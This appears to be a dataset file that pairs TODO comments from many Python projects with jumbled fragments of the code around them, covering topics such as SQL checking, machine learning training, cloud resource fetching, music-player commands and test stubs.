check_result.syntax_type = 2  # todo 工单类型 0、其他 1、ddl，2、dml </s> for statement in sqlparse.split(sql):	execute_check critical_ddl_regex = config.get('critical_ddl_regex', '') p = re.compile(critical_ddl_regex) statement = sqlparse.format(statement, strip_comments=True) if re.match(r"^select", statement.lower()):
except exception:   # todo </s> potential_index = 0	get_potentials potential_index = potential['potential_index'] + 1 block_index = potential['block_index'] + 1 block_index = config.BLOCK_FIRST block_count = bitcoin.rpc('getblockcount', [])
raise mpdnotimplemented # todo </s> def _commands(self):	_commands @register(r'^commands$')
# todo remove this constraint </s> finetuning = finetuning[finetuning['epoch'] <= 20]	df_from_results finetuning = pd.read_csv(exp / 'finetuning.csv') if eval(params['dataset']).startswith('ImageNet'): row += [finetuning['val_acc1'].max(), finetuning['val_acc5'].max()] else:
# todo(qos): register the callbacks to properly manage </s> pass	register_net_callbacks def register_net_callbacks(self):
# todo: find a better way to identify if it is a parameter schema </s> if schema.get('in'):	required_validator def required_validator(validator, req, instance, schema): but a list of properties everywhere else. if req is True and not instance: return [ValidationError("%s is required" % schema['name'])]
# todo: implement shape inference for xladynamicslice </s> res.set_shape(_aval_to_tf_shape(_out_aval))	_dynamic_slice if _enable_xla: res = tfxla.dynamic_slice(operand, start_indices, size_indices=slice_sizes) return res
# todo: clean up py3k support </s> if version_info < (3, 0):	decode_page contents = page.read() encoding = get_encoding(page, contents) or 'iso-8859-1' return unicode(contents, encoding=encoding).encode('utf-8') else:
# todo: raise alert for connection failure </s> return false	test_connection_and_alert def test_connection_and_alert(self): if self.test_connection()['error']: else: return True
# todo(stephenfin): remove this as it's related to nova-network </s> if 'security_groups' in updates:	create expected_attrs = [attr for attr in INSTANCE_DEFAULT_FIELDS if attr in updates] updates['security_groups'] = [x.name for x in updates['security_groups']]
# todo: serialization of new version realtions is disabled </s> ]	test_related_identifiers_serialization 'relation': 'isPartOf' } assert rids == expected_v2 parent_pid = PersistentIdentifier.get('recid', '1')
# todo(mierdin): note that this will always return true if rbac is not enabled </s> if rbac_utils.user_has_role(requester_user, role):	put LOG.info("Checking user %s is in role %s" % (requester_user, role)) LOG.info(rbac_utils.user_has_role(requester_user, role)) break else:
).consume()  # todo see issue 170 </s> load_ec2_instance_network_interfaces(neo4j_session, instance, aws_update_tag)	load_ec2_instances AWS_ACCOUNT_ID=current_aws_account_id, aws_update_tag=aws_update_tag,
# todo: there's a race with the initial "output" event. </s> wait(reason="event 'output'")	test_launch_ptvsd_client ], ) (req_initialize, req_launch, req_config ) = lifecycle_handshake(session, 'launch')
# todo: windows git class integration </s> return git("-c", "color.status=false", "status")	current_git_status @staticmethod def current_git_status():
# todo: rebalance if output distributions are 1d instead of 1d_var </s> in_col_vars = [v for (n, v) in sorted(agg_node.df_in_vars.items())]	agg_distributed_run parallel = False in_col_typ = [typemap[v.name] for v in in_col_vars] arg_typs = tuple([typemap[agg_node.key_arr.name]] + in_col_typ)
# todo(b/150147476, b/150024785): fix tf.function in tf1 crash. </s> call_impl = self.call_impl	call def call(self, inputs): if not hasattr(tf.compat.v1, "executing_eagerly_outside_functions" ) or tf.compat.v1.executing_eagerly_outside_functions():
# todo add verbose output </s> return self._timeout	ConnectionModel @property def timeout(self): @timeout.setter def timeout(self, new_timeout):
# todo: переделать механизм pairs </s> pair = pairs.get(abbr[:2], none)	extract else: starts_properties = [] if pair is not None: starts_properties = [prop for prop in prop_iter if prop.startswith(pair) and sub_string(prop, abbr)]
# todo verify permission type for the provided resource type </s> resolver = resolvers.get_resolver_for_permission_type(permission_type=permission_type)	user_has_resource_permission if not cfg.CONF.rbac.enable: return True result = resolver.user_has_resource_permission(user_db=user_db, resource_db=resource_db, permission_type=permission_type)
# todo - verify contents </s> self.client.logout()	testReviewList response = self.client.get('/r/') self.assertEqual(response.status_code, 200)
# todo: remove this if/when we support rh mode. </s> k_aug.options["dsdp_mode"] = ""	__init__ if k_aug is None: k_aug = SolverFactory("k_aug") if dot_sens is None: dot_sens = SolverFactory("dot_sens")
# todo stub </s> def test_accumulate() -> none:	test_accumulate pass
# var_params = config.get_variable_params()  # todo: better way? </s> datasets = xr_apply(sources, _make_dataset, dtype='o')  # store in dataarray to associate time -> dataset	find_source_datasets sources = unsqueeze_data_array(sources, 'time', 0, task['start_time'], task['sources'][0]['data'].sources.time.attrs) datasets = datasets_to_doc(datasets) return datasets, sources
# todo(ut) monkey patch </s> if encoding == 'cp65001':	decode def decode(byte_str, encoding=None, avoidEncodings=()): if isinstance(byte_str, unicode) or byte_str is None: return byte_str encoding = 'utf-8' if encoding:
# todo(stubexecutor): customize self.stubbed_component_ids to replace components </s> self.stubbed_component_ids = ['csvexamplegen', 'statisticsgen',	__init__ super(StubComponentLauncher, self).__init__(**kwargs) self.test_data_dir = "gs://{}/testdata".format(configs.GCS_BUCKET_NAME) 'SchemaGen', 'ExampleValidator', 'Trainer', 'Transform', 'Evaluator', 'Pusher']
# todo: should be injected </s> facade = awsfacade()	LambdasConfig class LambdasConfig(ResourceConfig): async def fetch_all(self, credentials, region, partition_name='aws', targets=None): functions = {} for raw_function in facade.get_lambda_functions(region):
# todo: check against plural_rules[lang]['nplurals'] </s> try:	twntranslate num = parameters lang = code.pop() index = plural_rules[lang]['plural'](num) except KeyError:
# todo: implement </s> pass	_option def _option(self, arg):
# todo: enable admin tests </s> if all:	test test_osf(ctx) test_api(ctx) test_addons(ctx) karma(ctx, single=True, browsers='PhantomJS')
# todo remove in 4.0 </s> warnings.warn("message.id_type is deprecated, use is_extended_id", deprecationwarning)	id_type @id_type.setter def id_type(self, value): self.is_extended_id = value
raise notimplementederror # todo </s> def em_step(self):	EM_step
pass # todo </s> def try_undo(self, *args):	try_undo
#todo: python2 specific, remove </s> try:	_process_tag printable = str(values[0:-1]) else: printable = str(values) except UnicodeEncodeError:
# todo: remove this hack asap </s> ws.emit(message("enclosure.mouth.reset"))	_hack_check_for_duplicates ws.emit(Message("enclosure.eyes.spin"))
# todo(huangtianhua): remove this method when bug #1479641 is fixed. </s> self.client_plugin().ignore_not_found(e)	handle_delete except Exception as e:
# todo use properties here to infer mechanism and purview from </s> return mip(direction=direction,	_null_mip @staticmethod def _null_mip(direction, mechanism, purview): mechanism=mechanism, purview=purview,
# todo: remove when #980 has been merged </s> info['url'] = formats[-1]['url']	_real_extract 'upload_date': upload_date, } info['ext'] = determine_ext(formats[-1]['url']) return self.video_result(info)
# because it's being configured too late -- bad! todo refactor! </s> event_logger.format_json = true	pre_init_hook if args.log_format == 'json': log_manager.format_json() else: log_manager.format_text()
# todo unordered float </s> return fcomi(ir, instr, a, b)	fucomi def fucomi(ir, instr, a=None, b=None):
#  todo: resolve symlinks etc </s> sys.executable = os.path.abspath(os.path.join(os.getcwd(),argv[0]))	entry_point def entry_point(argv): sys.argv = argv try:
# todo: don't write them? is *much* slower on re-load (~3x) </s> try:	update_pyfile fh.flush() os.fsync(fh.fileno())  # flush to disk os.unlink(pyfile + 'c') except OSError:
# todo (jian): double check why typing is crashing </s> module = self.get_submodule(module_name)  # type: ignore	apply_by_key assert module_name == param.name if module is None: if DataKey.get(dcate) in [DataKey.INPUT]: return self.apply_to_input(input, module_name, module, param)
# todo thread safe </s> self.releaseme=true	doReleaseMe def doReleaseMe(self):
#todo make more easy n1, n2, n3 </s> def save(data):	slotEditAccount data = data[0].internalPointer() self.accountEdit = AccountEdit.editAccount(types, data) self.accountEdit.close() n1 = data["acctype"]
# todo: write this method if possible </s> pass	address_transactions def address_transactions(self, addresslist):
# todo(dcramer): ideally we could just send the signal to the subprocess </s> self.task.status = taskstatus.failed	_timeout self._logthread.terminate() logging.error('Task(id=%s) exceeded time limit of %ds', self.task.id, self.timeout) self.task.date_finished = datetime.utcnow() db.session.add(self.task)
# @todo: investigate why this isn't working </s> if "exception" in result:	_handle_exception def _handle_exception(result, use_stderr=False): db(query).update(traceback = result["exception"]) current.s3task.scheduler.stop_task(W2P_TASK.id)
# todo: dump to file </s> if self._in == none:	close def close(self): return self._in.close()
# todo: migrate to new tilegrid format via library. </s> grid = {	run os.getenv("XRAY_DATABASE")), "r") as f: new_grid = json.load(f) 'tiles': new_grid, 'segments': {}
# todo: test coverage of this branch </s> logger.exception(	unsubscribe_request instance.send_activation_email(action='unsubscribe') except Exception, e: 'Error %s while submitting email to %s.', e, instance.email)
# todo this needs to be done on the content but seems to be a non-trival </s> if context.verbose:	pipe_fetchpage content = unicode(request.read(), request.headers['content-type'].split('charset=')[-1]) print "............FetchPage: content ................." print content.encode("utf-8")
# todo(mattjj): re-enable </s> raise skiptest("temporarily skipping test while debugging others")	testVmapOfPmap3 def testVmapOfPmap3(self): device_count = xla_bridge.device_count() if device_count < 2:
# todo: use the xmlrpc-c type indicators instead / additionally </s> if arg and arg[0] in "+-":	cooked args = [] for arg in raw_args: try: arg = int(arg, 10)
# todo: prompt </s> pager.footer ('q-uit, s-save')	prompt_commands def prompt_commands(pager):
# todo: provide more informative errors </s> try:	grant def grant(): Character control endpoint for policy granting. bob_pubkey = bytes.fromhex(request.args['bob_encrypting_key']) label = bytes.fromhex(request.args['label'])
# todo: remove this function </s> logger.warning((	execute def execute(state, host, callback, *args, **kwargs): [DEPRECATED], please use ``python.call``. 'Use of `python.execute` is deprecated, ' 'please use `python.call` instead.'
# todo: avoid use of _objects_by_key_id method </s> inp_keys, script_type, key = _objects_by_key_id(utxo.key_id)	transaction_create for utxo in selected_utxos: amount_total_input += utxo.value transaction.add_input(utxo.transaction.hash, utxo.output_n, keys=inp_keys, script_type=script_type, sigs_required=self.multisig_n_required, sort=self.sort_keys,
# todo: add at least reflection tests before adding notimplemented version </s> def prioid(context, *args):	prioid *musicpd.org, current playlist section:* ``prioid {PRIORITY} {ID...}``
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_depth_too_small def test_fail_depth_too_small(self): ``depth`` is < 1.
# todo: save additional models </s> return self.response(self.serialize_object(instance))	create instance, models = self.deserialize_object(data, self.model()) instance = self.save_object(instance, data)
# todo: this check may hide a bug a should be removed. </s> if not check_date:	is_expired if now > check_date + (seconds+minutes+hours) True is returned, else False return False total_hours = (day * 24) + hours
# todo: preallocate! </s> i, j, v = np.empty(0), np.empty(0), np.empty(0)	faceDiv if getattr(self, '_faceDiv', None) is None: self.number() for cell in self.sortedCells: i, j, v = cell.faceIndex
# todo: unit test this </s> new_mon_geom *= winman.gdk_screen.get_monitor_scale_factor(new_mon_id)	cycle_monitors new_mon_geom = Rectangle.from_gdk( winman.gdk_screen.get_monitor_geometry(new_mon_id)) logging.debug("Moving window to monitor %s, which has geometry %s", new_mon_id, new_mon_geom)
# todo: funcname, funcbody </s> self.assertequal(18, p._pos)	testStatLocalFunction self.assertIsNotNone(node)
# todo: consider returning an empty {} rather than raising </s> assert_raises(attributeerror, keyed_tuple._asdict)	test_empty eq_(keyed_tuple.__dict__, {}) assert_raises(AttributeError, keyed_tuple.keys) def should_raise(): keyed_tuple._fields
#todo redownload and verify against original? </s> self.wc.change_song_metadata(self.songs[0].full_data)	wc_upload_album_art self.wc.upload_album_art(self.songs[0].sid, test_utils.image_filename)
# todo test me ! </s> @register.filter	datedelta_from_day def datedelta_from_day(day_delta, date_from=None): if not date_from:
pass # todo </s> def _listallinfo(self, uri):	_listallinfo @register(r'^listallinfo "(?P<uri>[^"]+)"')
#todo: this is identical to regex in line 33 of subscribe.py! </s> regexword = "\\b" + "champagne*(?=!)" + "\\b"	champagne_in_text def champagne_in_text(text): return True if re.search(regexword, text, re.IGNORECASE) else False
# todo: only allow this if the task is still in error state </s> self.tiger._redis_move_task(self.queue, self.id, error, queued)	retry Retry a task that's in the error queue. assert self.state == ERROR
# todo: add for morph targets data. </s> return result_primitive	extract_primitive_pack attributes[joint_id].append(source_attributes[joint_id][old_index * 4 + vi]) attributes[weight_id].append(source_attributes[weight_id][old_index * 4 + vi])
# todo: enable specificity beyond hostname (e.g. include scheme, port) </s> return updater.__updaters.get( parsed_url.hostname )	get_updater def get_updater( url ): parsed_url = urlparse.urlparse( url )
# todo: this causes a blank window to be shown. </s> m = toga.window()	open_file def open_file(self, widget, **kwargs): file_name = m.select_folder_dialog(self.interface.name, None, False)[0] self.open_document(file_name)
# xxx todo </s> raise notimplementederror()	get_postmortem_exclusion_list elif bits not in (32, 64): raise NotImplementedError("Unknown architecture (%r bits)" % bits)
# todo: handle timeout </s> if self.__clientsocket is not none:	read @keyword timeout: the maximum time in millisecond to wait before a message can be reached @type timeout: :class:`int` return self.__clientSocket.recv(1024)
# todo: matthewp, profile this transfer </s> sequence_lengths = mask.sum(dim=1).data.cpu().numpy()	add_sentence_boundary_token_ids The new mask for the tensor, taking into account the appended tokens marking the beginning and end of the sentence. tensor_shape = list(tensor.data.shape) new_shape = list(tensor_shape)
# todo: in the future you can also add the possibility to synchronize from a chosen profile </s> try:	export_all_new_episodes exported_videoids_values = g.SHARED_DB.get_tvshows_id_list() excluded_videoids_values = g.SHARED_DB.get_tvshows_id_list(VidLibProp.exclude_update, True) guid_owner_profile = g.LOCAL_DB.get_guid_owner_profile() except ProfilesMissing as exc:
# todo: remove this method in v2.5 </s> elif self._values['disabled'] in booleans_true:	Parameters elif self._values['disabled'] in BOOLEANS_FALSE: return True return False elif self._values['state'] == 'disabled':
# todo(ringw): fix barline detection here. </s> self.assertequal(len(page.system[5].staff), 2)	testIMSLP00823_000_structure self.assertEqual(len(page.system[3].bar), 6) self.assertEqual(len(page.system[4].staff), 2) self.assertEqual(len(page.system[5].bar), 6)
# todo: establish what's the increment of ctc decoder (how many new letters might be there) [rough estimate] </s> y = self._e2e.dec.recognize_beam(h[0], lpz, self._recog_args, self._char_list, self._rnnlm)	accept_input lpz = self._e2e.ctc.log_softmax(h)[0] if self._recog_args.ctc_weight > 0.0 else None self._ctc_posteriors.append(lpz) self._partial_recognitions.append(y) return y
# todo: this doesn't always work. for some scores where a part uses more than one clef, more </s> xpathquery = './/{mei}music//{mei}score//{mei}staffdef'.format(mei=_meins)	allPartsPresent attributes. The second appearance of <staffDef> with @n="2" signals a change of clef on that same staff---not that there is a new staff. partNs = []  # hold the @n attribute for all the parts for staffDef in theConverter.documentRoot.findall(xpathQuery):
# todo(shardy): remove when we no longer support essex </s> nova = client.client(con.service_user, con.service_password,	authenticate no_cache=True) except TypeError: con.tenant, con.auth_url, proxy_token=token_id,
# todo: test me @jmcarp </s> admins = [	manage_contributors if user not in users ] user for user in users if self.has_permission(user, 'admin')
# todo: this needs to be deferred but for now we hard code </s> d = self.augmentservice.getaugmentrecord(record.guid,	_ldapResultToRecord ) if self.augmentService is not None: recordType) d.addCallback(lambda x:record.addAugmentInformation(x))
# todo: 验证 localport 有效性 </s> config = config._replace(localaddr=localaddr)	main if args.b: localAddr = args.b if args.l: localPort = args.l
# todo not portable, redo. </s> return	test_exploration_with_continuous_action_space def test_exploration_with_continuous_action_space(self): action_space = FloatBox(shape=(2,2), add_batch_rank=True) distribution = Normal()
pass  # todo </s> def playlist_create(self):	playlist_create @test(depends_on=[song_create])
# todo: skipped due to gh-4436 </s> yield skip_if_on_windows(skip_ssh(_test_create_store)), 'datalad-test'	test_create_simple def test_create_simple(): yield _test_create_store, None
# todo: getattr doesn't return by default members </s> metaclass = owner.metaclass()	_emit_no_member return False if isinstance(owner, astroid.Class): try: if metaclass and metaclass.getattr(name):
# todo: error detection </s> __connect()	deserialize_raw def deserialize_raw(collection_type): collection = mongodb[collection_type] return collection.find()
# todo: wrap backend call in error handling. </s> return backend.playback.get_time_position().get()	get_time_position backend = self._get_backend(self.get_current_tl_track()) if backend: else: return 0
#todo delete backward compatibility check after some versions </s> last_column_table = self.cur.execute('pragma table_info(scan_history)').fetchall()[-1][1]	get_latest_results self.cur.execute('SELECT filename FROM scan_history WHERE source="{}" AND scan_name="{}" ORDER BY last_modified DESC LIMIT 1;'.format(source, scan_name)) results = [r[0] for r in self.cur.fetchall()][0] if results and last_column_table == self.table_columns[-1]: processed = self.cur.execute('SELECT processed FROM scan_history WHERE filename="{}"'.format(results)).fetchall()[0][0]
# todo: launch visitor on node </s> return node	visit_Call new_name = "ExprInt%s" % integer.groups()[0] node.func.id = new_name
# todo: handle this case properly </s> continue	processUpdatedRepo review_branch = abdt_naming.makeReviewBranchFromName(b) if review_branch is None: review_branch = abdt_gittypes.makeGitReviewBranch( review_branch, remote)
# todo results from p0f </s> return	_get_ipv4_os @staticmethod def _get_ipv4_os(endpoint):
raise notimplementederror  # todo ... </s> return rec_vars_outputs	post_process_final_rec_vars_outputs :rtype: dict[str,tf.Tensor] if self.input_data.time_dim_axis is None and self._restrict_state_to_last_seq:
# todo: fix this assertionerror: eol while scanning string literal </s> self.assertcodeexecution("""	test_isspace def test_isspace(self): print(b'testisspace'.isspace()) print(b'test isspace'.isspace())
# todo: also preserve __module__, __name__ and a few other important attrs </s> return new_fn	coverage_with_hotshot return fp(*args, **kw) new_fn.__doc__ = fn.__doc__
# todo: support multiple sourcestamps </s> ss = cxt['ss'] = sslist[0]	StatusResourceBuild cxt['tests_link'] = req.childLink("tests") ssList = b.getSourceStamps() if ss.branch is None and ss.revision is None and ss.patch is None and not ss.changes: cxt['most_recent_rev_build'] = True
# forward all other methods. todo(l.zou): could use a proxy to automate these </s> return self._grad_op	compute_gradients self._grad_op = self._optimizer.compute_gradients(*args, **kwargs)
# todo: will be replaced with exception in future releases </s> logger.error('telegram does not support reply keyboard row width over %d.' % self.max_row_keys)	ReplyKeyboardMarkup def __init__(self, resize_keyboard=None, one_time_keyboard=None, selective=None, row_width=3): if row_width > self.max_row_keys: row_width = self.max_row_keys self.resize_keyboard = resize_keyboard
#todo: why can't we read emboss's swiss output? </s> self.check_can_read_emboss_conversion("genbank/cor6_6.gb", "genbank", "embl")	test_genbank self.check_can_read_emboss_conversion("GenBank/cor6_6.gb", "genbank", "pir")
# todo(b/148082271): remove this line once tft 0.22 is used. </s> transformed_features.pop(_transformed_name(_label_key), none)	serve_tf_examples_fn parsed_features = tf.io.parse_example(serialized_tf_examples, feature_spec) transformed_features = model.tft_layer(parsed_features) return model(transformed_features)
# todo: make test method </s> bz2	test_bz2 except: return False return True
raise invalidpocketleveldbworldexception()  # todo maybe try convert/load old pe world? </s> if len(root_tag_buf) != nbt.tag_int.fmt.unpack(length)[0]:	loadLevelDat if nbt.TAG_Int.fmt.unpack(magic)[0] < 3: logger.info("Found an old level.dat file. Aborting world load") raise nbt.NBTFormatError() self.root_tag = nbt.load(buf=root_tag_buf)
# todo: somehow caused by circular import under python3 refactor </s> web.py3_restart_typ = starttyp	setRestartTyp def setRestartTyp(self,starttyp): self.restart = starttyp
"meta.deleted": false,  # todo(tsileo): retrieve deleted and expose tombstone </s> 'type': {'$in': [activitytype.create.value, activitytype.announce.value]},	outbox q = { "box": Box.OUTBOX.value, } return jsonify(
# todo: total hack below. implement more principled formatting. </s> def process(line):	process if not line.startswith('#'): return '    ' + line
# todo implement project_out and uncomment this </s> dw_dp = self.optimal_transform.jacobian(	_align self.image, mean_appearance, self.optimal_transform, interpolator=self._interpolator) mean_appearance.masked_pixel_indices) VI_dW_dp = self.residual.steepest_descent_images(
# todo: floats </s> children.append(child)	split_inline_box document.fixed_boxes.append(child) else: continue child.position_y = box.position_y
# todo: make these http requests asynchronous. not easy since we don't </s> url = api_retweets_url % tweet['id']	get_activities if fetch_shares: for tweet in tweets: tweet['retweets'] = json.loads(self.urlread(url)) return total_count, [self.tweet_to_activity(t) for t in tweets]
# todo: this is an ugly workaround. remove after refactoring the player and titlebar. </s> self._player._first_play = false	__on_progress_press Remember that progress scale is clicked so it won't get updates from the player. self.progress_scale_clicked = True return False
## todo: # fixme: remove me </s> if not paste_childrens:	get_all_pastes_domain paste_parent = father.replace(self.paste_directory, '')[1:] paste_childrens = self.r_serv_metadata.smembers('paste_children:{}'.format(paste_parent)) paste_childrens = self.r_serv_metadata.smembers('paste_children:{}'.format(father)) for children in paste_childrens:
# todo(blee): this should be derived from the dataset size. </s> eval_program_params.steps_per_loop = eval_steps_per_loop	SimpleProgramScheduleForTask eval_program_params = EvalProgram.Params() eval_program_params.name = 'eval_tpu' eval_program_params.dataset_name = dataset_name program_schedule_params.eval_programs.append(eval_program_params)
# todo private access.. </s> argument_iterator = field_tree_instance._arguments.unpack()	_infer_field if field_tree_instance.name.string_name == 'ForeignKey': if isinstance(field_tree_instance, TreeInstance): key, lazy_values = next(argument_iterator, (None, None)) if key is None and lazy_values is not None:
# todo: we currently use the same data for test and validation. </s> return self._get_eval_dataset()	test_dataloader def test_dataloader(self):
# todo: warn/error: check if this var has units: assigning </s> if type(val) not in native_numeric_types:	set_value then the validation step is skipped. if not valid and val is not None: if self.parent_component()._units is not None: _src_magnitude = value(val)
@skipif('device-openmp')  # todo: still unsupported with openmp, but soon will be </s> assert np.all(u.data[1] == 72)	test_streaming_two_buffers assert np.all(u.data[0] == 56)
# todo: rework resolver install system to log and report what has been done. </s> return tool.tool_requirements_status	uninstall_dependencies tool = self._get_tool(id) tool._view.uninstall_dependencies(index=None, requirements=tool.requirements)
# todo(zaneb): ensure parameters can be formatted for xml </s> yield (key, value)	transform yield ('links', [make_link(req, value)]) else:
# todo: temporary work around to issue #225 on github </s> clear_cache()	run_acoustic_forward def run_acoustic_forward(dse=None): dimensions = (50, 50, 50) origin = (0., 0., 0.)
# todo autoescape context </s> return nodelist.render(context(function()))	massaman t = get_template(file_name) nodelist = t.nodelist
pass # todo </s> else:	write_serialize for field in spec.parsed_fields(): if field.is_array: if field.is_builtin: write_serialize_builtin(s, field)
# todo: must be implemented </s> self.app = app()	start def start(self): self.app.initialize()
#todo print appropriate error message </s> raise notimplementederror	get_results stream = Expression('OpenRead', findfile).evaluate(evaluation) if stream == Symbol('$Failed'): tmp = Expression(tmp_function, stream).evaluate(evaluation) Expression('Close', stream).evaluate(evaluation)
# todo implement support for this </s> if elem.find('geometry') is none:	parseSDFLink else: elemdict['material'] = parseSDFMaterial(name, elem.find('material')) log("   No geometry defined for {} {} in link {}! Skipped..".format( objtype, name, newlink['name']), 'ERROR')
# todo(sloria): test me </s> return os.path.join('dropbox', 'files', self.path)	file_url raise ValueError('Path field must be defined.')
federated_only=federated_only,  # todo: 289 </s> identity_evidence=identity_evidence.message_as_bytes	batch_from_bytes rest_host=rest_info.host, rest_port=rest_info.port, ) stranger_ursulas.append(stranger_ursula_from_public_keys)
raise notimplementederror  # todo </s> if self.distributed_tf_enabled:	map_producer_to_consumer :rtype: tensorflow.data.Dataset if self.horovod_enabled: raise NotImplementedError  # TODO return dataset
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	plug_vifs def plug_vifs(self, instance, network_info):
# todo(benjaoming) for 0.15, remove this </s> def _move_to_new_location(old, new):	handle call_command("migrate", merge=True, verbosity=options.get("verbosity")) call_command("syncdb", interactive=False, verbosity=options.get("verbosity"), database="assessment_items") if os.path.exists(old): if os.access(settings.KHAN_CONTENT_PATH, os.W_OK):
# todo: with git <= 2.3 keep old mechanism: </s> env = {'git_ssh_command': "ssh -s %s" % cnct.ctrl_path}	clone cnct = ssh_manager.get_connection(url) cnct.open() else: env = None
data_source_name='case-sql',  # todo: this isn't really needed. </s> document_type='commcarecasesql',  # todo: should this be the same as the couch models?	_change_meta_from_sql_case document_id=case.case_id, data_source_type=data_sources.CASE_SQL, document_subtype=case.type, domain=case.domain,
# todo: handle errors from _common_run? </s> acme, doms = _common_run(	auth else: installer = None args, config, acc, authenticator=authenticator, installer=installer) if not acme.obtain_and_enroll_certificate(doms, authenticator, installer):
# todo: support complex </s> return self._filter('convolve2d', dtype, xp, scp)	test_convolve2d def test_convolve2d(self, xp, scp, dtype):
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_success_single_digest This does the same thing as generating a regular address from the corresponding key.
# todo: template requires address otherwise it throws an exception </s> order_with_items_and_stock.shipping_address = billing_address	test_view_order_packing_slips user selects on extra menu Packing Slips user downloads the packing slips as PDF file order_with_items_and_stock.billing_address = billing_address order_with_items_and_stock.save()
# todo do a proper mro resolution. currently we are just listing </s> for cls in self.py_bases():	py_mro mro.add(cls) mro = [self] add(cls) for cls_new in cls.mro():
# todo: log exception </s> return none	scan output = sshexec(host, list2cmdline(cmdline), port=port, username=user, key_filename=conf["key"]) except Exception as e: output = output.decode("utf-8", errors='replace') virusresults = re.findall("(?:\([^\)]*\) )?([^\s]+) (.+)\s+$", output, re.MULTILINE)
# todo: should assert that domain exists here but this breaks tests </s> case_db = formprocessorinterface(domain).casedb_cache(	get_related_cases return {} wrap = isinstance(next(iter(initial_cases)), CommCareCase) domain=domain, strip_history=strip_history,
# todo: additional treatment for "too many arguments"? although </s> file_chunks = generate_chunks(files, chunk_size)	generate_file_chunks ) // (maxl + 3)  # +3 for possible quotes and a space ) return file_chunks
# todo: handle fancy-index copies by allocating a buffer and </s> rval = tuple(	next When there are no more batches to return. next_index = self._subset_iterator.next() fn(data[next_index]) if fn else data[next_index] for data, fn in safe_izip(self._raw_data, self._convert))
# todo: test training too </s> answers = reader(questions)	smoke_test reader = readers.readers[reader_name](shared_resources) reader.setup_from_data(data_set) assert answers, "%s should produce answers" % reader_name
# todo: specific exception handling </s> display_message("project configuration: error parsing types from %s. configuration may be wrong." % source, "warning", 5)	__parse_term_hierarchy root_nodes = __read_term_hierarchy(hierarchy.split("\n")) except: root_nodes = default return root_nodes
# todo: actually read newtablename. </s> try:	infer Sample INFER INTO: INFER columnstring FROM tablename WHERE whereclause WITH confidence INTO newtablename LIMIT limit; Argument newtablename == null/emptystring if we don't want to do INTO conn = psycopg2.connect('dbname=sgeadmin user=sgeadmin') cur = conn.cursor()
# todo: remove logging </s> log.exception(	handle_bounce_reply_phase content_type = msg.get_content_type().lower() if content_type != "multipart/report" or envelope.mail_from != "<>": "Handle auto responder %s %s %s", content_type, envelope.mail_from, msg )
continue  # todo: 168 check version and update if required. </s> if node.verify_interface():	learn_from_teacher_node for node in node_list: if node.checksum_public_address in self._known_nodes: self.log.info("Prevously unknown node: {}".format(node.checksum_public_address)) if eager:
# todo(dolph): can be uncommented pending bug 968519 </s> user)	test_create_null_user_name user['id'],
# todo add test </s> result = []	_augment_heatmaps def _augment_heatmaps(self, heatmaps, random_state, parents, hooks): nb_heatmaps = len(heatmaps) seeds = random_state.randint(0, 10**6, (nb_heatmaps,))
# todo: make a function and more generic (move to psutil) </s> get_bat_state = s.getoutput("cat /sys/class/power_supply/bat0/status")	mon_autofreq get_cur_gov = s.getoutput("cpufreqctl --governor") gov_state = get_cur_gov.split()[0] bat_state = get_bat_state.split()[0] if bat_state == "Discharging":
# todo support multiple backends </s> self.backends[0].stored_playlists.playlists = playlists	playlists @playlists.setter  # noqa def playlists(self, playlists):
# todo: boulder messes up content-type #56 </s> return response	_post else: raise errors.NetworkError(response)
# todo: log exception </s> return none	scan output = sshexec(host, list2cmdline(cmdline), port=port, username=user, key_filename=conf["key"]) except Exception as e: output = output.decode("utf-8", errors='replace') virusresults = re.findall("(?:\([^\)]*\) )?([^\s]+) (.+)\s+$", output, re.MULTILINE)
if result.was_accepted:  # todo: here, we need to assess the result and see if we're actually good to go. </s> kfrag = policy.assign_kfrag_to_contract(contract)	grant found_ursulas = policy.find_ursulas(networky_stuff, deposit, expiration, num_ursulas=n) for ursula, contract, result in found_ursulas: contract.activate(kfrag, ursula, result) policy.enact(networky_stuff)  # REST call happens here, as does population of TreasureMap.
self.my_sender('text/cache-manifest', bytes(manifest, 'utf-8')) # todo: cache-control/last-modified headers </s> manifest += '\n# hash: {}'.format(hasher.hexdigest().upper())	redirect_manifest hasher.update(bytes(SETTINGS['HTTP_Interface_IP'] + ':' + str(SETTINGS['HTTP_Port']), 'utf-8'))
# todo: semi-bounded -> exponential distribution. </s> else:	__init__ elif action_component.low != float("-inf") and action_component.high != float("inf"): self.bounded_action_space[flat_key] = True raise RLGraphError( "Semi-bounded action spaces are not supported yet! You passed in low={} high={}.".\
# todo(b/160795287): deprecate estimator based executor. </s> fn_args_dict = fn_args.get_dict()	run_fn fn_args: Holds args used to train the model as name/value pairs. schema = io_utils.parse_pbtxt_file(fn_args.schema_file, schema_pb2.Schema()) fn_args_dict['serving_model_dir'] = os.path.join(fn_args.model_run_dir, path_utils.SERVING_MODEL_DIR)
# todo ... </s> assert isinstance(v.body, cstatement)	test_parse_c_cast v = state.vars["v"]
# todo fix. </s> self.assertequals(reil_ctx_out["xmm0"], res)	test_movhpd reil_instrs = self.__asm_to_reil(asm, address) reil_ctx_out, _ = self.reil_emulator.execute(reil_instrs, start=address << 8, registers=ctx_init) self.assertEquals(reil_ctx_out["xmm1"], ctx_init["xmm1"])
# todo(mordred): special casing auth_url here. we should </s> if 'auth' in config and 'auth_url' in config['auth']:	get_one_cloud if type(config[key]) is not bool: config[key] = get_boolean(config[key]) config['auth']['auth_url'] = config['auth']['auth_url'].format( **config)
# todo make sure this works </s> log("creating sensors...", 'info')	buildModelFromDictionary rootlink['modelname'] = model['name'] rootlink.location = (0, 0, 0) if 'sensors' in model and model['sensors']: for sen in model['sensors']:
# todo: needs more testing </s> for heap in self.heaps[:-1]:	add_value_to_heaps def add_value_to_heaps(self, ref: z3.ExprRef, typ: Type, value: object) -> None: heap.append((ref, typ, copy.deepcopy(value))) self.heaps[-1].append((ref, typ, value))
# todo(inf) commented out lines were only in fnv branch </s> exportmenu.links.append(mod_fullnames_export())	InitModLinks exportMenu.links.append(Mod_Prices_Export()) elif bush.game.fsName in (u'Fallout3', u'FalloutNV'): exportMenu.links.append(Mod_Prices_Export()) exportMenu.links.append(Mod_FactionRelations_Export())
raise notimplementederror # todo </s> def em_step(self):	EM_step
